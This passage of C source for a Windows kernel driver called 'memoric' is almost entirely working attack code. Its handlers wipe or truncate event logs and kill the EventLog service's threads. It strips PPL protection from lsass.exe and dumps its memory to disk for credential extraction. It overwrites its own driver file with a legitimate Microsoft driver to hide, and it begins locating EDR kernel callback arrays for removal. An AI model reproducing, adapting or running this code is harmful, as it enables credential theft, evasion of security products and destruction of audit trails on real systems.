                dispInfo.DeleteFile = TRUE;
                ZwSetInformationFile(fileHandle, &ioStatus, &dispInfo,
                                    sizeof(dispInfo), FileDispositionInformation);
                ZwClose(fileHandle);
                filesDeleted++;
                DbgPrint("[memoric] EventLog: Deleted %wZ\n", &evtxPath);
            } else {
                /* Try to zero the file instead */
                st = ZwOpenFile(&fileHandle, GENERIC_WRITE, &objAttr, &ioStatus,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, 0);
                if (NT_SUCCESS(st)) {
                    FILE_END_OF_FILE_INFORMATION eofInfo = { 0 };
                    eofInfo.EndOfFile.QuadPart = 0;
                    ZwSetInformationFile(fileHandle, &ioStatus, &eofInfo,
                                        sizeof(eofInfo), FileEndOfFileInformation);
                    ZwClose(fileHandle);
                    filesDeleted++;
                    DbgPrint("[memoric] EventLog: Truncated %wZ\n", &evtxPath);
                }
            }
        }

        resp->FilesDeleted = filesDeleted;
        resp->Success = (filesDeleted > 0) ? 1 : 0;
        break;
    }

    case MEMORIC_EVTLOG_KILL_SERVICE: {
        /*
         * Find the svchost.exe hosting the EventLog service and suspend/kill
         * its threads so no new log entries can be written.
         *
         * Approach: enumerate all svchost.exe processes via SystemProcessInformation,
         * then use ZwQueryVirtualMemory(MemoryMappedFilenameInformation) to scan for
         * wevtsvc.dll mappings — avoids fragile PEB/LDR offset assumptions.
         *
         * Reference: Phant0m project (GitHub) — EventLog service thread killing
         */
        PEPROCESS process = NULL;
        NTSTATUS st;
        ULONG threadsKilled = 0;
        ULONG pid;
        ULONG targetPid = 0;

        /* Phase 1: Find the EventLog svchost by scanning mapped files */
        {
            PVOID procBuf = NULL;
            ULONG bufSize = 0;

            st = ZwQuerySystemInformation(5 /* SystemProcessInformation */, NULL, 0, &bufSize);
            if (bufSize > 0) {
                bufSize += 8192;
                procBuf = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufSize, MEMORIC_POOL_TAG);
                if (procBuf) {
                    st = ZwQuerySystemInformation(5, procBuf, bufSize, &bufSize);
                    if (NT_SUCCESS(st)) {
                        PSYSTEM_PROCESS_INFO_APC cur = (PSYSTEM_PROCESS_INFO_APC)procBuf;
                        while (TRUE) {
                            if (cur->ImageName.Buffer != NULL && cur->ImageName.Length > 0) {
                                UNICODE_STRING svchostStr;
                                RtlInitUnicodeString(&svchostStr, L"svchost.exe");
                                if (RtlCompareUnicodeString(&cur->ImageName, &svchostStr, TRUE) == 0) {
                                    /*
                                     * Scan this svchost's address space for wevtsvc.dll using
                                     * ZwQueryVirtualMemory(MemoryMappedFilenameInformation).
                                     * This is more reliable than PEB/LDR walking.
                                     */
                                    PEPROCESS svchostProc = NULL;
                                    st = PsLookupProcessByProcessId(cur->UniqueProcessId, &svchostProc);
                                    if (NT_SUCCESS(st)) {
                                        KAPC_STATE apcState;
                                        KeStackAttachProcess(svchostProc, &apcState);
                                        __try {
                                            /* Scan user-mode DLL range for wevtsvc.dll mapping */
                                            ULONG_PTR addr = 0x10000; /* Skip NULL page */
                                            ULONG_PTR maxAddr = 0x7FFFFFFF0000ULL;
                                            MEMORY_BASIC_INFORMATION mbi;
                                            UCHAR nameBuf[512];
                                            UNICODE_STRING wevtsvcStr;
                                            RtlInitUnicodeString(&wevtsvcStr, L"wevtsvc.dll");

                                            while (addr < maxAddr && targetPid == 0) {
                                                SIZE_T retLen = 0;
                                                st = ZwQueryVirtualMemory(ZwCurrentProcess(), (PVOID)addr,
                                                    MemoryBasicInformation, &mbi, sizeof(mbi), &retLen);
                                                if (!NT_SUCCESS(st)) break;

                                                if (mbi.Type == MEM_IMAGE && mbi.State == MEM_COMMIT) {
                                                    /* Check the mapped filename */
                                                    PUNICODE_STRING mappedName;
                                                    st = ZwQueryVirtualMemory(ZwCurrentProcess(), (PVOID)addr,
                                                        MemoryMappedFilenameInformation, nameBuf, sizeof(nameBuf), &retLen);
                                                    if (NT_SUCCESS(st)) {
                                                        mappedName = (PUNICODE_STRING)nameBuf;
                                                        if (mappedName->Length > wevtsvcStr.Length) {
                                                            /* Check if the filename ends with wevtsvc.dll */
                                                            UNICODE_STRING tail;
                                                            tail.Buffer = mappedName->Buffer +
                                                                (mappedName->Length - wevtsvcStr.Length) / sizeof(WCHAR);
                                                            tail.Length = wevtsvcStr.Length;
                                                            tail.MaximumLength = wevtsvcStr.Length;
                                                            if (RtlCompareUnicodeString(&tail, &wevtsvcStr, TRUE) == 0) {
                                                                targetPid = (ULONG)(ULONG_PTR)cur->UniqueProcessId;
                                                            }
                                                        }
                                                    }
                                                }

                                                ULONG_PTR regionEnd = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
                                                if (regionEnd <= addr) break; /* overflow guard */
                                                addr = regionEnd;
                                            }
                                        } __except (EXCEPTION_EXECUTE_HANDLER) {
                                            /* VM query may fault */
                                        }
                                        KeUnstackDetachProcess(&apcState);
                                        ObDereferenceObject(svchostProc);
                                    }
                                    if (targetPid != 0) break;
                                }
                            }
                            if (cur->NextEntryOffset == 0) break;
                            cur = (PSYSTEM_PROCESS_INFO_APC)((PUCHAR)cur + cur->NextEntryOffset);
                        }
                    }
                    ExFreePoolWithTag(procBuf, MEMORIC_POOL_TAG);
                }
            }
        }

        resp->SvchostPid = targetPid;

        /* Phase 2: Enumerate and terminate threads of the EventLog svchost */
        if (targetPid != 0) {
            /* Dynamically resolve ZwTerminateThread */
            UNICODE_STRING ztName;
            RtlInitUnicodeString(&ztName, L"ZwTerminateThread");
            PFN_ZwTerminateThread pfnZwTerminateThread =
                (PFN_ZwTerminateThread)MmGetSystemRoutineAddress(&ztName);

            if (!pfnZwTerminateThread) {
                DbgPrint("[memoric] EventLog: ZwTerminateThread not found\n");
            } else {
            PVOID procBuf2 = NULL;
            ULONG bufSize2 = 0;

            st = ZwQuerySystemInformation(5, NULL, 0, &bufSize2);
            if (bufSize2 > 0) {
                bufSize2 += 8192;
                procBuf2 = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufSize2, MEMORIC_POOL_TAG);
                if (procBuf2) {
                    st = ZwQuerySystemInformation(5, procBuf2, bufSize2, &bufSize2);
                    if (NT_SUCCESS(st)) {
                        PSYSTEM_PROCESS_INFO_APC cur = (PSYSTEM_PROCESS_INFO_APC)procBuf2;
                        while (TRUE) {
                            if ((ULONG)(ULONG_PTR)cur->UniqueProcessId == targetPid) {
                                ULONG ti;
                                for (ti = 0; ti < cur->NumberOfThreads; ti++) {
                                    HANDLE tid = cur->Threads[ti].ClientId.UniqueThread;
                                    PETHREAD thrd = NULL;
                                    st = PsLookupThreadByThreadId(tid, &thrd);
                                    if (NT_SUCCESS(st)) {
                                        /* Open thread handle for termination */
                                        HANDLE thrdHandle = NULL;
                                        st = ObOpenObjectByPointer(thrd, OBJ_KERNEL_HANDLE,
                                            NULL, THREAD_TERMINATE, *PsThreadType, KernelMode, &thrdHandle);
                                        if (NT_SUCCESS(st)) {
                                            pfnZwTerminateThread(thrdHandle, STATUS_SUCCESS);
                                            ZwClose(thrdHandle);
                                            threadsKilled++;
                                        }
                                        ObDereferenceObject(thrd);
                                    }
                                }
                                break;
                            }
                            if (cur->NextEntryOffset == 0) break;
                            cur = (PSYSTEM_PROCESS_INFO_APC)((PUCHAR)cur + cur->NextEntryOffset);
                        }
                    }
                    ExFreePoolWithTag(procBuf2, MEMORIC_POOL_TAG);
                }
            }
            } /* end pfnZwTerminateThread check */

            DbgPrint("[memoric] EventLog: Killed %lu threads in svchost PID %lu\n",
                     threadsKilled, targetPid);
        }

        resp->ThreadsKilled = threadsKilled;
        resp->Success = (threadsKilled > 0) ? 1 : 0;
        break;
    }
    }

    *bytesReturned = sizeof(MEMORIC_EVENT_LOG_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * Credential Dump — Read process memory from kernel (bypass PPL)
 * ---------------------------------------------------------------- */

static NTSTATUS HandleCredDump(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_CRED_DUMP_REQUEST reqCopy;
    PMEMORIC_CRED_DUMP_RESPONSE resp;
    PEPROCESS process = NULL;
    NTSTATUS st;
    SIZE_T bytesRead = 0;

    if (inputLength < sizeof(MEMORIC_CRED_DUMP_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_CRED_DUMP_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_CRED_DUMP_REQUEST));

    /* Limit read size */
    if (reqCopy.Size > MEMORIC_MAX_IO_SIZE)
        reqCopy.Size = MEMORIC_MAX_IO_SIZE;

    /* Ensure output buffer is large enough */
    ULONG neededOutput = sizeof(MEMORIC_CRED_DUMP_RESPONSE) + reqCopy.Size;
    if (outputLength < neededOutput && reqCopy.Action == MEMORIC_CRED_READ_MEMORY)
        reqCopy.Size = outputLength - sizeof(MEMORIC_CRED_DUMP_RESPONSE);

    resp = (PMEMORIC_CRED_DUMP_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_CRED_DUMP_RESPONSE));

    switch (reqCopy.Action) {
    case MEMORIC_CRED_FIND_LSASS: {
        /* Find lsass.exe PID */
        ULONG pid;
        for (pid = 4; pid < 65536; pid += 4) {
            st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &process);
            if (!NT_SUCCESS(st)) continue;

            PUCHAR imgName = PsGetProcessImageFileName(process);
            if (imgName && _stricmp((char*)imgName, "lsass.exe") == 0) {
                resp->ProcessId = pid;
                resp->EprocessAddr = (ULONG64)(ULONG_PTR)process;
                resp->Success = 1;
                ObDereferenceObject(process);
                DbgPrint("[memoric] CredDump: Found lsass.exe at PID %lu EPROCESS=%p\n", pid, process);
                break;
            }
            ObDereferenceObject(process);
        }
        *bytesReturned = sizeof(MEMORIC_CRED_DUMP_RESPONSE);
        return STATUS_SUCCESS;
    }

    case MEMORIC_CRED_READ_MEMORY: {
        if (reqCopy.ProcessId == 0) {
            *bytesReturned = sizeof(MEMORIC_CRED_DUMP_RESPONSE);
            return STATUS_SUCCESS;
        }

        st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)reqCopy.ProcessId, &process);
        if (!NT_SUCCESS(st)) {
            DbgPrint("[memoric] CredDump: PID %lu not found\n", reqCopy.ProcessId);
            *bytesReturned = sizeof(MEMORIC_CRED_DUMP_RESPONSE);
            return STATUS_SUCCESS;
        }

        resp->ProcessId = reqCopy.ProcessId;
        resp->EprocessAddr = (ULONG64)(ULONG_PTR)process;

        /* Use MmCopyVirtualMemory to read target process memory */
        PVOID dataOut = (PUCHAR)systemBuffer + sizeof(MEMORIC_CRED_DUMP_RESPONSE);

        st = MmCopyVirtualMemory(
            process,
            (PVOID)(ULONG_PTR)reqCopy.Address,
            PsGetCurrentProcess(),
            dataOut,
            reqCopy.Size,
            KernelMode,
            &bytesRead
        );

        ObDereferenceObject(process);

        if (NT_SUCCESS(st)) {
            resp->BytesRead = (ULONG)bytesRead;
            resp->Success = 1;
            *bytesReturned = sizeof(MEMORIC_CRED_DUMP_RESPONSE) + (ULONG)bytesRead;
        } else {
            DbgPrint("[memoric] CredDump: MmCopyVirtualMemory failed 0x%08X\n", st);
            *bytesReturned = sizeof(MEMORIC_CRED_DUMP_RESPONSE);
        }
        return STATUS_SUCCESS;
    }

    case MEMORIC_CRED_DUMP_FULL: {
        /*
         * Full credential dump: enumerate all committed memory regions of lsass
         * and write a raw dump to disk. User-mode can then parse it offline.
         *
         * If reqCopy.Address != 0, it's treated as a UNICODE path for the output file.
         * Otherwise, dumps to \\??\\C:\\Windows\\Temp\\m.dmp (auto-deleted by caller).
         *
         * Approach:
         *   1) Find lsass.exe
         *   2) Strip PPL (if present) by zeroing EPROCESS.Protection
         *   3) Walk VA regions via ZwQueryVirtualMemory(MemoryBasicInformation)
         *   4) For each MEM_COMMIT region, read via MmCopyVirtualMemory
         *   5) Write region header + data to output file
         *   6) Return total regions, total bytes written
         *
         * Reference: MimiDrv kernel dump approach, PPLKiller
         */
        ULONG pid = 0;
        HANDLE fileHandle = NULL;
        UNICODE_STRING dumpPath;
        OBJECT_ATTRIBUTES objAttr;
        IO_STATUS_BLOCK ioStatus;
        ULONG64 totalWritten = 0;
        ULONG regionCount = 0;
        ULONG errorCount = 0;

        /* Find lsass.exe */
        for (pid = 4; pid < 65536; pid += 4) {
            st = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &process);
            if (!NT_SUCCESS(st)) continue;
            PUCHAR imgName = PsGetProcessImageFileName(process);
            if (imgName && _stricmp((char*)imgName, "lsass.exe") == 0) {
                resp->ProcessId = pid;
                resp->EprocessAddr = (ULONG64)(ULONG_PTR)process;
                break;
            }
            ObDereferenceObject(process);
            process = NULL;
        }

        if (!process) {
            resp->Success = 0;
            *bytesReturned = sizeof(MEMORIC_CRED_DUMP_RESPONSE);
            return STATUS_SUCCESS;
        }

        /* Temporarily strip PPL protection if enabled */
        UCHAR origProtection = 0;
        if (g_Offsets.Resolved && g_Offsets.Protection != 0) {
            PUCHAR protByte = (PUCHAR)process + g_Offsets.Protection;
            origProtection = *protByte;
            if (origProtection != 0) {
                *protByte = 0;
                DbgPrint("[memoric] CredDump: Stripped PPL 0x%02X from lsass PID %lu\n",
                         origProtection, pid);
            }
        }

        /* Open dump file */
        RtlInitUnicodeString(&dumpPath, L"\\??\\C:\\Windows\\Temp\\m.dmp");
        InitializeObjectAttributes(&objAttr, &dumpPath,
            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

        st = ZwCreateFile(&fileHandle, GENERIC_WRITE | SYNCHRONIZE, &objAttr,
            &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
        if (!NT_SUCCESS(st)) {
            DbgPrint("[memoric] CredDump: Failed to create dump file 0x%08X\n", st);
            /* Restore PPL */
            if (origProtection != 0 && g_Offsets.Protection != 0) {
                *((PUCHAR)process + g_Offsets.Protection) = origProtection;
            }
            ObDereferenceObject(process);
            *bytesReturned = sizeof(MEMORIC_CRED_DUMP_RESPONSE);
            return STATUS_SUCCESS;
        }

        /* Write a simple header: "MDMP" magic + PID + EPROCESS */
        {
            struct { char magic[4]; ULONG pid; ULONG64 eprocess; ULONG64 reserved; } hdr;
            hdr.magic[0] = 'R'; hdr.magic[1] = 'A'; hdr.magic[2] = 'W'; hdr.magic[3] = 'D';
            hdr.pid = pid;
            hdr.eprocess = (ULONG64)(ULONG_PTR)process;
            hdr.reserved = 0;
            LARGE_INTEGER writeOff = { 0 };
            ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatus, &hdr, sizeof(hdr), &writeOff, NULL);
            totalWritten += sizeof(hdr);
        }

        /* Walk virtual memory regions and dump each committed region */
        {
            ULONG_PTR addr = 0;
            MEMORY_BASIC_INFORMATION mbi;
            PVOID readBuf = ExAllocatePool2(POOL_FLAG_NON_PAGED, 0x10000, MEMORIC_POOL_TAG);

            if (readBuf) {
                KAPC_STATE apcState;
                while (addr < 0x7FFFFFFFFFFF) {
                    /* Query from process context */
                    KeStackAttachProcess(process, &apcState);
                    __try {
                        st = ZwQueryVirtualMemory(
                            ZwCurrentProcess(), (PVOID)addr,
                            0 /* MemoryBasicInformation */,
                            &mbi, sizeof(mbi), NULL);
                    } __except (EXCEPTION_EXECUTE_HANDLER) {
                        st = GetExceptionCode();
                    }
                    KeUnstackDetachProcess(&apcState);

                    if (!NT_SUCCESS(st)) break;

                    /* Move to next region */
                    ULONG_PTR nextAddr = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
                    if (nextAddr <= addr) break; /* Overflow protection */

                    /* Only dump committed, readable regions */
                    if (mbi.State == MEM_COMMIT &&
                        (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
                         PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
                         PAGE_EXECUTE_WRITECOPY | PAGE_WRITECOPY))) {

                        /* Write region header */
                        struct {
                            ULONG64 baseAddr;
                            ULONG64 regionSize;
                            ULONG   protect;
                            ULONG   state;
                        } regHdr;
                        regHdr.baseAddr = (ULONG64)(ULONG_PTR)mbi.BaseAddress;
                        regHdr.regionSize = (ULONG64)mbi.RegionSize;
                        regHdr.protect = mbi.Protect;
                        regHdr.state = mbi.State;

                        LARGE_INTEGER wo;
                        wo.QuadPart = (LONGLONG)totalWritten;
                        ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatus,
                                   &regHdr, sizeof(regHdr), &wo, NULL);
                        totalWritten += sizeof(regHdr);

                        /* Read and write in 64KB chunks */
                        SIZE_T remaining = mbi.RegionSize;
                        ULONG_PTR readAddr = (ULONG_PTR)mbi.BaseAddress;

                        while (remaining > 0) {
                            SIZE_T chunk = (remaining > 0x10000) ? 0x10000 : remaining;
                            SIZE_T br = 0;

                            st = MmCopyVirtualMemory(
                                process, (PVOID)readAddr,
                                PsGetCurrentProcess(), readBuf,
                                chunk, KernelMode, &br);

                            if (!NT_SUCCESS(st) || br == 0) {
                                /* Zero-fill unreadable pages */
                                RtlZeroMemory(readBuf, chunk);
                                br = chunk;
                                errorCount++;
                            }

                            wo.QuadPart = (LONGLONG)totalWritten;
                            ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatus,
                                       readBuf, (ULONG)br, &wo, NULL);
                            totalWritten += br;
                            readAddr += br;
                            remaining -= br;
                        }
                        regionCount++;
                    }
                    addr = nextAddr;
                }
                ExFreePoolWithTag(readBuf, MEMORIC_POOL_TAG);
            }
        }

        ZwClose(fileHandle);

        /* Restore PPL protection */
        if (origProtection != 0 && g_Offsets.Resolved && g_Offsets.Protection != 0) {
            *((PUCHAR)process + g_Offsets.Protection) = origProtection;
            DbgPrint("[memoric] CredDump: Restored PPL 0x%02X for lsass\n", origProtection);
        }

        ObDereferenceObject(process);

        resp->Success = (regionCount > 0) ? 1 : 0;
        resp->BytesRead = (ULONG)(totalWritten & 0xFFFFFFFF);
        DbgPrint("[memoric] CredDump: Full dump complete — %lu regions, %llu bytes, %lu errors\n",
                 regionCount, totalWritten, errorCount);
        *bytesReturned = sizeof(MEMORIC_CRED_DUMP_RESPONSE);
        return STATUS_SUCCESS;
    }
    }

    *bytesReturned = sizeof(MEMORIC_CRED_DUMP_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * Driver Impersonate — Swap driver file on disk with legit MS driver
 * ---------------------------------------------------------------- */

static NTSTATUS HandleDriverImpersonate(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_DRIVER_IMPERSONATE_REQUEST reqCopy;
    PMEMORIC_DRIVER_IMPERSONATE_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_DRIVER_IMPERSONATE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_DRIVER_IMPERSONATE_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_DRIVER_IMPERSONATE_REQUEST));
    resp = (PMEMORIC_DRIVER_IMPERSONATE_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_DRIVER_IMPERSONATE_RESPONSE));

    switch (reqCopy.Action) {
    case MEMORIC_IMPERSONATE_SWAP: {
        /*
         * 1) Read & backup original target driver file
         * 2) Read the legitimate driver file
         * 3) Overwrite target with legit content
         * The in-memory driver stays loaded (only on-disk image changes).
         */
        UNICODE_STRING legitPath, targetPath;
        OBJECT_ATTRIBUTES objAttr;
        HANDLE srcFile = NULL, dstFile = NULL;
        IO_STATUS_BLOCK ioStatus;
        NTSTATUS st;
        PVOID fileBuffer = NULL;
        FILE_STANDARD_INFORMATION fileInfo;

        RtlInitUnicodeString(&legitPath, reqCopy.LegitPath);
        RtlInitUnicodeString(&targetPath, reqCopy.TargetPath);

        /* Step 1: Backup the target (our driver) file before overwriting */
        if (g_OrigDriverBackup == NULL) {
            InitializeObjectAttributes(&objAttr, &targetPath,
                                       OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
            st = ZwOpenFile(&dstFile, GENERIC_READ, &objAttr, &ioStatus,
                           FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE);
            if (NT_SUCCESS(st)) {
                st = ZwQueryInformationFile(dstFile, &ioStatus, &fileInfo,
                                           sizeof(fileInfo), FileStandardInformation);
                if (NT_SUCCESS(st) && fileInfo.EndOfFile.QuadPart > 0 &&
                    fileInfo.EndOfFile.QuadPart <= 16 * 1024 * 1024) {
                    ULONG backupSize = (ULONG)fileInfo.EndOfFile.QuadPart;
                    PVOID backup = ExAllocatePool2(POOL_FLAG_NON_PAGED, backupSize, MEMORIC_POOL_TAG);
                    if (backup) {
                        LARGE_INTEGER readOff = { 0 };
                        st = ZwReadFile(dstFile, NULL, NULL, NULL, &ioStatus,
                                       backup, backupSize, &readOff, NULL);
                        if (NT_SUCCESS(st)) {
                            g_OrigDriverBackup = backup;
                            g_OrigDriverBackupSize = backupSize;
                            /* Also save the target path for restore */
                            RtlCopyMemory(g_OrigDriverPath, reqCopy.TargetPath,
                                          sizeof(g_OrigDriverPath));
                            DbgPrint("[memoric] Impersonate: Backed up original driver (%lu bytes)\n",
                                     backupSize);
                        } else {
                            ExFreePoolWithTag(backup, MEMORIC_POOL_TAG);
                        }
                    }
                }
                ZwClose(dstFile);
                dstFile = NULL;
            }
        }

        /* Step 2: Read the legit driver */
        InitializeObjectAttributes(&objAttr, &legitPath,
                                   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
        st = ZwOpenFile(&srcFile, GENERIC_READ, &objAttr, &ioStatus,
                       FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE);
        if (!NT_SUCCESS(st)) {
            resp->NtStatus = st;
            DbgPrint("[memoric] Impersonate: Failed to open legit file 0x%08X\n", st);
            break;
        }

        st = ZwQueryInformationFile(srcFile, &ioStatus, &fileInfo,
                                   sizeof(fileInfo), FileStandardInformation);
        if (!NT_SUCCESS(st) || fileInfo.EndOfFile.QuadPart > 16 * 1024 * 1024) {
            ZwClose(srcFile);
            resp->NtStatus = st;
            break;
        }

        ULONG fileSize = (ULONG)fileInfo.EndOfFile.QuadPart;
        fileBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, fileSize, MEMORIC_POOL_TAG);
        if (!fileBuffer) {
            ZwClose(srcFile);
            resp->NtStatus = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        {
            LARGE_INTEGER offset = { 0 };
            st = ZwReadFile(srcFile, NULL, NULL, NULL, &ioStatus, fileBuffer, fileSize, &offset, NULL);
            ZwClose(srcFile);
            if (!NT_SUCCESS(st)) {
                ExFreePoolWithTag(fileBuffer, MEMORIC_POOL_TAG);
                resp->NtStatus = st;
                break;
            }
        }

        /* Step 3: Overwrite target with legit content */
        InitializeObjectAttributes(&objAttr, &targetPath,
                                   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
        st = ZwOpenFile(&dstFile, GENERIC_WRITE | DELETE, &objAttr, &ioStatus,
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                       FILE_NON_DIRECTORY_FILE);
        if (!NT_SUCCESS(st)) {
            st = ZwCreateFile(&dstFile, GENERIC_WRITE, &objAttr, &ioStatus,
                            NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
        }
        if (!NT_SUCCESS(st)) {
            ExFreePoolWithTag(fileBuffer, MEMORIC_POOL_TAG);
            resp->NtStatus = st;
            DbgPrint("[memoric] Impersonate: Failed to open target file 0x%08X\n", st);
            break;
        }

        {
            LARGE_INTEGER offset = { 0 };
            st = ZwWriteFile(dstFile, NULL, NULL, NULL, &ioStatus, fileBuffer, fileSize, &offset, NULL);
            ZwClose(dstFile);
        }
        ExFreePoolWithTag(fileBuffer, MEMORIC_POOL_TAG);

        if (NT_SUCCESS(st)) {
            resp->BytesWritten = fileSize;
            resp->Success = 1;
            DbgPrint("[memoric] Impersonate: Swapped driver file (%lu bytes)\n", fileSize);
        } else {
            resp->NtStatus = st;
        }
        break;
    }

    case MEMORIC_IMPERSONATE_RESTORE: {
        /*
         * Restore original driver from backup buffer to disk.
         * Uses the saved target path and backup data from SWAP.
         */
        if (g_OrigDriverBackup == NULL || g_OrigDriverBackupSize == 0) {
            resp->NtStatus = STATUS_NO_DATA_DETECTED;
            DbgPrint("[memoric] Impersonate: No backup available for restore\n");
            break;
        }

        UNICODE_STRING restorePath;
        OBJECT_ATTRIBUTES objAttr;
        IO_STATUS_BLOCK ioStatus;
        HANDLE dstFile = NULL;
        NTSTATUS st;

        RtlInitUnicodeString(&restorePath, g_OrigDriverPath);
        InitializeObjectAttributes(&objAttr, &restorePath,
                                   OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

        st = ZwOpenFile(&dstFile, GENERIC_WRITE, &objAttr, &ioStatus,
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                       FILE_NON_DIRECTORY_FILE);
        if (!NT_SUCCESS(st)) {
            st = ZwCreateFile(&dstFile, GENERIC_WRITE, &objAttr, &ioStatus,
                            NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
        }
        if (!NT_SUCCESS(st)) {
            resp->NtStatus = st;
            DbgPrint("[memoric] Impersonate: Failed to open target for restore 0x%08X\n", st);
            break;
        }

        {
            LARGE_INTEGER offset = { 0 };
            st = ZwWriteFile(dstFile, NULL, NULL, NULL, &ioStatus,
                           g_OrigDriverBackup, g_OrigDriverBackupSize, &offset, NULL);
            ZwClose(dstFile);
        }

        if (NT_SUCCESS(st)) {
            resp->BytesWritten = g_OrigDriverBackupSize;
            resp->Success = 1;
            DbgPrint("[memoric] Impersonate: Restored original driver (%lu bytes)\n",
                     g_OrigDriverBackupSize);

            /* Free backup after successful restore */
            ExFreePoolWithTag(g_OrigDriverBackup, MEMORIC_POOL_TAG);
            g_OrigDriverBackup = NULL;
            g_OrigDriverBackupSize = 0;
        } else {
            resp->NtStatus = st;
        }
        break;
    }

    case MEMORIC_IMPERSONATE_QUERY:
        resp->Success = (g_OrigDriverBackup != NULL) ? 1 : 0;
        resp->BytesWritten = g_OrigDriverBackupSize;
        break;
    }

    *bytesReturned = sizeof(MEMORIC_DRIVER_IMPERSONATE_RESPONSE);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Phase 14 Handlers
 * ================================================================ */

/* ----------------------------------------------------------------
 * Callback Nuke — Enumerate and forcefully remove kernel callbacks
 * EDR products register via PsSetCreateProcessNotifyRoutine(Ex),
 * PsSetCreateThreadNotifyRoutine, PsSetLoadImageNotifyRoutine,
 * ObRegisterCallbacks, CmRegisterCallbackEx.
 *
 * These live in kernel callback arrays:
 *   PspCreateProcessNotifyRoutine[64]
 *   PspCreateThreadNotifyRoutine[64]
 *   PspLoadImageNotifyRoutine[64]
 * Each entry is (callback_addr | 0x1) — low bit is a "registered" flag,
 * actual struct pointer is entry & ~0xF.
 * At +0x8 of the pointed struct: the actual callback function.
 * ---------------------------------------------------------------- */

static PVOID FindCallbackArrayEx(PUCHAR kernelBase, ULONG kernelSize, const char* exportName, PULONG outCount)
{
    /*
     * Strategy: Find PsSetCreateProcessNotifyRoutine(Ex) in ntoskrnl,
     * scan for LEA instructions that reference the callback array.
     * The array address appears as: LEA r??, [rip + disp32]
     */
    PVOID funcAddr = NULL;
    PIMAGE_NT_HEADERS ntHdr;
    PIMAGE_EXPORT_DIRECTORY exports;
    ULONG i;

    ntHdr = RtlImageNtHeader(kernelBase);
    if (!ntHdr) return NULL;

    exports = (PIMAGE_EXPORT_DIRECTORY)(kernelBase +
        ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PULONG nameRvas = (PULONG)(kernelBase + exports->AddressOfNames);
    PUSHORT ordinals = (PUSHORT)(kernelBase + exports->AddressOfNameOrdinals);
    PULONG funcRvas = (PULONG)(kernelBase + exports->AddressOfFunctions);

    for (i = 0; i < exports->NumberOfNames; i++) {
        PCHAR name = (PCHAR)kernelBase + nameRvas[i];
        if (strcmp(name, exportName) == 0) {
            funcAddr = kernelBase + funcRvas[ordinals[i]];
            break;
        }
    }

    if (!funcAddr) return NULL;

    /* Scan function body for LEA r??, [rip + disp32] pattern (0x48 8D xx xx xx xx xx or 0x4C 8D) */
    __try {
        PUCHAR scan = (PUCHAR)funcAddr;
        PUCHAR end = scan + 256; /* Callback array ref is usually within first 256 bytes */
        for (; scan < end - 7; scan++) {
            /* 48 8D 0D xx xx xx xx = LEA rcx, [rip+disp32] */
            /* 4C 8D xx xx xx xx xx = LEA r8-r15, [rip+disp32] */
            if ((scan[0] == 0x48 || scan[0] == 0x4C) && scan[1] == 0x8D &&
                (scan[2] & 0xC7) == 0x05) { /* modrm: mod=00, r/m=101 (RIP-relative) */
                LONG disp = *(PLONG)(scan + 3);
                PVOID target = (PVOID)(scan + 7 + disp);
                /* Validate: target should be within ntoskrnl .data */
                if ((ULONG_PTR)target > (ULONG_PTR)kernelBase &&
                    (ULONG_PTR)target < (ULONG_PTR)kernelBase + kernelSize) {
                    if (outCount) *outCount = 64; /* Max callback slots */
